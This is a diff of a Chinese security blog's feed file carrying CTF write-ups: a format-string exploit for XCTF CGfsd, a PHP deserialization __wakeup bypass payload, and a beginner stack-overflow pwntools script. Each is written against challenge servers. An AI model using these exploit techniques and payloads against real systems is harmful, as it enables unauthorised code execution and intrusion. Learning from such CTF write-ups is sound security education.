+<p>介绍一个格式化字符串的用法<strong>%5$d</strong>,表示参数从左到右第5个参数，好多博客这里没有讲，但是不同类型会不会有影响就不知道了，比如参数的类型不同，size不同，printf是不知道栈的那个位置具体是什么类型的。</p>
+<p>直接输出s，没有格式化字符串。一般情况下是正常的输出s。但是一旦s中存在格式化字符串就可能存在漏洞。这个时候<strong>s就相当于format</strong>，但是没有传入任何参数。printf就会<strong>从栈顶开始依次匹配</strong>相应的类型大小数据输出。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">printf(s);</span><br></pre></td></tr></table></figure>
+<h3 id="实例">实例</h3>
+<p>写一个小的C文件看看。</p>
+<p><img src="/images/xctf-CGfsd/2348945-20210924214658533-1665723789.png" /></p>
+<p>输入AAAA%x-%x-%x-%x-%x-%x-%x-%x-%x-%x,可以发现从栈顶开始依次输出。可以看到地址61FE3C的位置存储着s字符串。匹配的第7个单元是s的实际存储位置。</p>
+<p><strong>主要是中间调用了printf函数导致很难具体分析栈空间，所以需要使用这种方法找到偏移位置。</strong></p>
+<figure>
+<img src="/images/xctf-CGfsd/2348945-20210924214649609-1405132903.png" alt="image-20210924214644435" /><figcaption aria-hidden="true">image-20210924214644435</figcaption>
+</figure>
+<figure>
+<img src="/images/xctf-CGfsd/2348945-20210924220054329-1040800902.png" alt="image-20210924220048916" /><figcaption aria-hidden="true">image-20210924220048916</figcaption>
+</figure>
+<h2 id="xtf_cgfsd">XTF_CGFSD</h2>
+<figure>
+<img src="/images/xctf-CGfsd/2348945-20210924220519202-68676763.png" alt="image-20210924220513883" /><figcaption aria-hidden="true">image-20210924220513883</figcaption>
+</figure>
+<p><strong>目标：</strong>将pwnme的地址放到字符串s中，并且使用%(offset)$n将输出的字符串长度8放到那个地址中。将那个地址作为printf传入的第offset个参数。</p>
+<figure>
+<img src="/images/xctf-CGfsd/2348945-20210924214603821-1020535736.png" alt="image-20210924214557978" /><figcaption aria-hidden="true">image-20210924214557978</figcaption>
+</figure>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>  *</span><br><span class="line">r=remote(<span class="string">&quot;111.200.241.244&quot;</span>,<span class="number">55024</span>)</span><br><span class="line">r.recvuntil(<span class="string">&quot;please tell me your name:&quot;</span>)</span><br><span class="line">r.send(<span class="string">&quot;sdsds&quot;</span>)</span><br><span class="line">p=<span class="number">0x804A068</span></span><br><span class="line">payload=p32(p)+<span class="string">&quot;aaaa&quot;</span>+<span class="string">&quot;%10$n&quot;</span></span><br><span class="line">r.recvuntil(<span class="string">&quot;leave your message please:&quot;</span>)</span><br><span class="line">r.send(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+<figure>
+<img src="/images/xctf-CGfsd/2348945-20210924214806885-2131536334.png" alt="image-20210924214801629" /><figcaption aria-hidden="true">image-20210924214801629</figcaption>
+</figure>
+]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>pwn</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>xctf-unserialize3</title>
+    <url>/2021/11/12/xctf-unserialize3.html</url>
+    <content><![CDATA[<p>xctf web php序列化和反序列化</p>
+<span id="more"></span>
+<meta name="referrer" content="no-referrer"/>
+<h3 id="序列化和反序列化">序列化和反序列化</h3>
+<p>序列化通俗来讲就是将对象转化为可以传输的字符串；</p>
+<p>反序列化就是把那串可以传输的字符串再变回对象。</p>
+<h4 id="例子">例子：</h4>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">chybeta</span></span>&#123;</span><br><span class="line">        <span class="keyword">var</span> <span class="variable">$test</span> = <span class="string">&#x27;123&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$class1</span> = <span class="keyword">new</span> chybeta;    <span class="comment">//这里就是创建啦一个新的对象</span></span><br><span class="line"><span class="variable">$class1_ser</span> = serialize(<span class="variable">$class1</span>);   <span class="comment">//将这个对象进行字符串封装，就是对其进行序列化</span></span><br><span class="line">print_r(<span class="variable">$class1_ser</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<figure>
+<img src="../images/xctf-unserialize3/20190814175124372.png" alt="img" /><figcaption aria-hidden="true">img</figcaption>
+</figure>
+<p>来解释一下：O:7:"chybeta":1:{s:4:"test";s:3:"123";}</p>
+<p>这里的O呢就是object对象的意思，数字7代表着对象的函数名有7个占位，然后就是对象名了</p>
+<p>这个数字1表示对象里有一个变量，大括号里的s代表的是string类型还有一个i是int型</p>
+<p>再使用反序列化函数，结果print为chybeta Object([test] =&gt; 123)</p>
+<p>原文链接：https://blog.csdn.net/LTtiandd/article/details/99591998</p>
+<h3 id="魔法函数">魔法函数</h3>
+<figure>
+<img src="/images/xctf-unserialize3/2348945-20210802102700561-1202520313.png" alt="在这里插入图片描述" /><figcaption aria-hidden="true">在这里插入图片描述</figcaption>
+</figure>
+<h3 id="题目分析">题目分析</h3>
+<p>访问看到<img src="/images/xctf-unserialize3/2348945-20210802102055943-1130257407.png" alt="image-20210802102055048" /></p>
+<p>明显需要看出需要绕过__wakeup函数才行，？code表名使用GET方法传参数__</p>
+<p>code可能是XCTF类序列化再反序列化的结果</p>
+<p>**_wakeup()函数漏洞原理：当序列化字符串表示对象属性个数的值大于真实个数的属性时就会跳过__wakeup的执行。**</p>
+<p>所以将对象数改成1以上的值就可以，也就是XCTF后的2，表示的是类中的变量的个数。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload: ?code=O:4:&quot;xctf&quot;:2:&#123;s:4:&quot;flag&quot;;s:3:&quot;111&quot;;&#125;</span><br></pre></td></tr></table></figure>
+<p>参考：<a href="https://blog.csdn.net/qq_36438489/article/details/106141535">(3条消息) 攻防世界-unserialize3_魔术函数，以及wakeup（）函数的绕过_Kvein Fisher的博客-CSDN博客</a></p>
+]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>web</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>xctf-fakebook</title>
     <url>/2021/11/12/xctf-fakebook.html</url>
     <content><![CDATA[<p>攻防世界-web-fakebook结题过程</p>
@@ -693,94 +781,6 @@ k\left(x_{i}, x_{j}\right)=\exp \left(-\frac{\left\|x_{i}-x_{j}\right\|}{2 \delt
       </categories>
       <tags>
         <tag>web</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>xctf-unserialize3</title>
-    <url>/2021/11/12/xctf-unserialize3.html</url>
-    <content><![CDATA[<p>xctf web php序列化和反序列化</p>
-<span id="more"></span>
-<meta name="referrer" content="no-referrer"/>
-<h3 id="序列化和反序列化">序列化和反序列化</h3>
-<p>序列化通俗来讲就是将对象转化为可以传输的字符串；</p>
-<p>反序列化就是把那串可以传输的字符串再变回对象。</p>
-<h4 id="例子">例子：</h4>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">chybeta</span></span>&#123;</span><br><span class="line">        <span class="keyword">var</span> <span class="variable">$test</span> = <span class="string">&#x27;123&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$class1</span> = <span class="keyword">new</span> chybeta;    <span class="comment">//这里就是创建啦一个新的对象</span></span><br><span class="line"><span class="variable">$class1_ser</span> = serialize(<span class="variable">$class1</span>);   <span class="comment">//将这个对象进行字符串封装，就是对其进行序列化</span></span><br><span class="line">print_r(<span class="variable">$class1_ser</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<figure>
-<img src="../images/xctf-unserialize3/20190814175124372.png" alt="img" /><figcaption aria-hidden="true">img</figcaption>
-</figure>
-<p>来解释一下：O:7:"chybeta":1:{s:4:"test";s:3:"123";}</p>
-<p>这里的O呢就是object对象的意思，数字7代表着对象的函数名有7个占位，然后就是对象名了</p>
-<p>这个数字1表示对象里有一个变量，大括号里的s代表的是string类型还有一个i是int型</p>
-<p>再使用反序列化函数，结果print为chybeta Object([test] =&gt; 123)</p>
-<p>原文链接：https://blog.csdn.net/LTtiandd/article/details/99591998</p>
-<h3 id="魔法函数">魔法函数</h3>
-<figure>
-<img src="/images/xctf-unserialize3/2348945-20210802102700561-1202520313.png" alt="在这里插入图片描述" /><figcaption aria-hidden="true">在这里插入图片描述</figcaption>
-</figure>
-<h3 id="题目分析">题目分析</h3>
-<p>访问看到<img src="/images/xctf-unserialize3/2348945-20210802102055943-1130257407.png" alt="image-20210802102055048" /></p>
-<p>明显需要看出需要绕过__wakeup函数才行，？code表名使用GET方法传参数__</p>
-<p>code可能是XCTF类序列化再反序列化的结果</p>
-<p>**_wakeup()函数漏洞原理：当序列化字符串表示对象属性个数的值大于真实个数的属性时就会跳过__wakeup的执行。**</p>
-<p>所以将对象数改成1以上的值就可以，也就是XCTF后的2，表示的是类中的变量的个数。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload: ?code=O:4:&quot;xctf&quot;:2:&#123;s:4:&quot;flag&quot;;s:3:&quot;111&quot;;&#125;</span><br></pre></td></tr></table></figure>
-<p>参考：<a href="https://blog.csdn.net/qq_36438489/article/details/106141535">(3条消息) 攻防世界-unserialize3_魔术函数，以及wakeup（）函数的绕过_Kvein Fisher的博客-CSDN博客</a></p>
-]]></content>
-      <categories>
-        <category>CTF</category>
-      </categories>
-      <tags>
-        <tag>web</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>PWN入门</title>
-    <url>/2021/11/12/PWN%E5%85%A5%E9%97%A8.html</url>
-    <content><![CDATA[<p>pwn 入门学习，走一遍流程</p>
-<span id="more"></span>
-<meta name="referrer" content="no-referrer"/>
-<p>[TOC]</p>
-<p><a href="https://buuoj.cn/challenges">BUUCTF在线评测 (buuoj.cn)</a> rip</p>
-<h2 id="checksec">checksec</h2>
-<p>使用,查看文件的加固机制</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">checksec filename#老版</span><br><span class="line">checksec --file=filename #新版</span><br></pre></td></tr></table></figure>
-<center>
-<image src="https://upload-images.jianshu.io/upload_images/11071922-51baa910d9fa15dc.png?imageMogr2/auto-orient/strip|imageView2/2/w/626/format/webp"/>
-</center>
-<p><strong>Arch:</strong>程序架构信息</p>
-<p><strong>RELRO</strong>（relocation read-only)：主要针对GOT改写的攻击方式，分为两种，partial relro和full relro</p>
-<p>部分RELRO 易受到攻击，例如攻击者可以<strong>atoi.got为system.plt，进而输入/bin/sh00获得shell</strong> 完全RELRO 使整个 GOT 只读，从而无法被覆盖，但这样会大大增加程序的启动时间，因为程序在启动之前需要解析所有的符号。</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gcc -o hello test.c // 默认情况下，是Partial RELRO</span><br><span class="line">gcc -z norelro -o hello test.c // 关闭，即No RELRO</span><br><span class="line">gcc -z lazy -o hello test.c // 部分开启，即Partial RELRO</span><br><span class="line">gcc -z now -o hello test.c // 全部开启，即Full RELRO</span><br></pre></td></tr></table></figure>
-<p><strong>stack-caacry:</strong>栈溢出保护。当启用栈保护后，函数开始执行的时候会先往栈里插入类似cookie的信息，当函数真正返回的时候会验证cookie信息是否合法，如果不合法就停止程序运行。攻击者在覆盖返回地址的时候往往也会将cookie信息给覆盖掉，导致栈保护检查失败而阻止shellcode的执行。</p>
-<p><strong>NX：</strong>开启会让栈中数据没有执行权限，无法触发shellcode，只会造成程序崩溃，可以利用rop绕过。</p>
-<p><strong>PIE</strong>：位置无关可执行，程序运行时各个段加载的虚拟地址是再装载时确定。</p>
-<h2 id="静态分析代码">静态分析代码</h2>
-<p>看到main函数，gets函数可能存在栈溢出漏洞，接着点击s局部变量进入栈空间。</p>
-<figure>
-<img src="/images/PWN%E5%85%A5%E9%97%A8/2348945-20210924133030041-1533255546.png" alt="image-20210924133025356" /><figcaption aria-hidden="true">image-20210924133025356</figcaption>
-</figure>
-<p>第一次看到略感奇怪怎么两个s，r又是什么。首先明确这是main函数的栈空间，<strong>上面的s是局部变量，下面的s指的是rbp</strong>，64位程序8个字节。r比较特殊，有的地方说是return的东西，但是返回东西一般是通过寄存器eax或rax返回的，有点忘了。<strong>r应该是main函数执行完成后，EIP的值，即main函数结束后要执行的下一条执行。</strong></p>
-<p>栈溢出漏洞请自行补充知识。</p>
-<p><img src="/images/PWN%E5%85%A5%E9%97%A8/2348945-20210924133138596-1167051620.png" /></p>
-<p>找到提权函数，这个还没有搞懂，大概就是让mian函数执行完了，执行fun函数，然后既可以cat flag了。</p>
-<p><img src="/images/PWN%E5%85%A5%E9%97%A8/2348945-20210924133524694-1219666581.png" /></p>
-<h2 id="动态分析">动态分析</h2>
-<p>难度大一些的才需要，使用GDB和peda分析。</p>
-<h2 id="编写exp">编写exp</h2>
-<p>remote和process一个是远程服务器，一个是本地尝试，使用时只用一个。</p>
-<p>本地测试需要赋予可执行的权限，不然总是显示没有权限sudo也不行。</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">chmod a+x pwn1</span><br></pre></td></tr></table></figure>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>, <span class="number">28082</span>)</span><br><span class="line"><span class="comment">#r = process(&#x27;./pwn1&#x27;) </span></span><br><span class="line">p1 = <span class="string">&quot;a&quot;</span>*(<span class="number">0xf</span> + <span class="number">0x8</span>) + p64(<span class="number">0x0401185</span>) + p64(<span class="number">0x0401186</span>)</span><br><span class="line"></span><br><span class="line">r.sendline(p1) <span class="comment">#哈啊哈</span></span><br><span class="line"></span><br><span class="line">r.interactive()<span class="comment">#进入交互模式</span></span><br></pre></td></tr></table></figure>
-<h2 id="参考">参考</h2>
-<p><a href="https://www.jianshu.com/p/755e52d48a77">checksec工具使用-pwn - 简书 (jianshu.com)</a></p>
-<p>[(12条消息) <a href="https://blog.csdn.net/weixin_45004513/article/details/117332121">CTF PWN] 从0到0.00001 PWN入门超级详细_Csome-CSDN博客</a></p>
-]]></content>
-      <categories>
-        <category>CTF</category>
-      </categories>
-      <tags>
-        <tag>pwn</tag>
       </tags>
   </entry>
   <entry>
